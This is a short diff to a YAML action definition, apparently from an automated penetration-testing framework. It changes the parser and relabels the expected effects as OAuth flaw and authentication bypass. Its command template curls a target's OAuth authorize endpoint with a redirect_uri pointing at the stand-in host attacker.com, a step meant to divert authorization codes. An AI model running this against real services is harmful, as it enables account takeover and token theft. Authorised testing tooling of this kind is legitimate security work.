@@ -6,9 +6,10 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: curl -s '{target_url}/oauth/authorize?redirect_uri=http://attacker.com/callback&response_type=code&client_id={client_id}'
-parser: null
+parser: web_response_parser
 expected_effects:
-- action_completed
+- oauth_flawed
+- auth_bypassed
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
